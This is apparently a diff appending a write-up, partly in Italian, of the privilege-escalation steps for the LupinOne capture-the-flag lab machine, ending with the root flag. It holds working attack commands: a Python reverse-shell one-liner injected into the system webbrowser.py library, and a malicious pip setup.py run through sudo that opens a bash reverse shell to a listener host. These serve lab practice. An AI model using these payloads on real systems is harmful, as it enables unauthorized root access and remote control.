@@ -286,3 +286,89 @@ import webbrowser
 print ("Its not yet ready to get in action")
 
 webbrowser.open("https://empirecybersecurity.co.mz")
+
+
+nc -lvnp 1234
+
+nano /usr/lib/python3.9/webbrowser.py
+
+inserisco codice malevolo per aprire connession
+import pty,socket;s=socket.socket();s.connect(("192.168.1.10",1234));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")
+
+sudo -u arsene python3.9 /home/arsene/heist.py
+
+nel listener ora che è connesso 
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+e divento arsene come utente
+
+arsene@LupinOne:/$ sudo -l
+sudo -l
+Matching Defaults entries for arsene on LupinOne:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User arsene may run the following commands on LupinOne:
+    (root) NOPASSWD: /usr/bin/pip
+
+arsene@LupinOne:/$ TF=$(mktemp -d) && echo -e "from setuptools import setup\nimport os\nos.system('/bin/bash -c \"bash -i >& /dev/tcp/192.168.1.10/4444 0>&1\"')\nsetup(name='pwn', version='1.0')" > $TF/setup.py && sudo pip install $TF 2>/dev/null
+
+ nc -lvnp 4444
+
+listening on [any] 4444 ...
+connect to [192.168.1.10] from (UNKNOWN) [192.168.1.9] 57892
+root@LupinOne:/tmp/pip-req-build-am281f86# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@LupinOne:/tmp/pip-req-build-am281f86# whoami
+whoami
+root
+root@LupinOne:/tmp/pip-req-build-am281f86# cd /root
+cd /root
+root@LupinOne:~# ls
+ls
+root.txt
+root@LupinOne:~# cat root.txt   
+cat root.txt
+*,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(((((((((((((((((((((,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+,                       .&&&&&&&&&(            /&&&&&&&&&                       
+,                    &&&&&&*                          @&&&&&&                   
+,                *&&&&&                                   &&&&&&                
+,              &&&&&                                         &&&&&.             
+,            &&&&                   ./#%@@&#,                   &&&&*           
+,          &%&&          &&&&&&&&&&&**,**/&&(&&&&&&&&             &&&&          
+,        &@(&        &&&&&&&&&&&&&&&.....,&&*&&&&&&&&&&             &&&&        
+,      .& &          &&&&&&&&&&&&&&&      &&.&&&&&&&&&&               &%&       
+,     @& &           &&&&&&&&&&&&&&&      && &&&&&&&&&&                @&&&     
+,    &%((            &&&&&&&&&&&&&&&      && &&&&&&&&&&                 #&&&    
+,   &#/*             &&&&&&&&&&&&&&&      && #&&&&&&&&&(                 (&&&   
+,  %@ &              &&&&&&&&&&&&&&&      && ,&&&&&&&&&&                  /*&/  
+,  & &               &&&&&&&&&&&&&&&      &&* &&&&&&&&&&                   & &  
+, & &                &&&&&&&&&&&&&&&,     &&& &&&&&&&&&&(                   &,@ 
+,.& #                #&&&&&&&&&&&&&&(     &&&.&&&&&&&&&&&                   & & 
+*& &                 ,&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&             &(&
+*& &                 ,&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&            & &
+*& *              &&&&&&&&&&&&&&&&&&&@.                 &&&&&&&&             @ &
+*&              &&&&&&&&&&&&&&&&&&@    &&&&&/          &&&&&&                & &
+*% .           &&&&&&&&&&&@&&&&&&&   &  &&(  #&&&&   &&&&.                   % &
+*& *            &&&&&&&&&&   /*      @%&%&&&&&&&&    &&&&,                   @ &
+*& &               &&&&&&&           & &&&&&&&&&&     @&&&                   & &
+*& &                    &&&&&        /   /&&&&         &&&                   & @
+*/(,                      &&                            &                   / &.
+* & &                     &&&       #             &&&&&&      @             & &.
+* .% &                    &&&%&     &    @&&&&&&&&&.   %@&&*               ( @, 
+/  & %                   .&&&&  &@ @                 &/                    @ &  
+*   & @                  &&&&&&    &&.               ,                    & &   
+*    & &               &&&&&&&&&& &    &&&(          &                   & &    
+,     & %           &&&&&&&&&&&&&&&(       .&&&&&&&  &                  & &     
+,      & .. &&&&&&&&&&&&&&&&&&&&&&&&&&&&*          &  &                & &      
+,       #& & &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&        &.             %  &       
+,         &  , &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&.     &&&&          @ &*        
+,           & ,, &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&.  /&&&&&&&&    & &@          
+,             &  & #&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&  &&&&&&&@ &. &&            
+,               && /# /&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&# &&&# &# #&               
+,                  &&  &( .&&&&&&&&&&&&&&&&&&&&&&&&&&&  &&  &&                  
+/                     ,&&(  &&%   *&&&&&&&&&&%   .&&&  /&&,                     
+,                           &&&&&/...         .#&&&&#                           
+
+3mp!r3{congratulations_you_manage_to_pwn_the_lupin1_box}
+See you on the next heist.
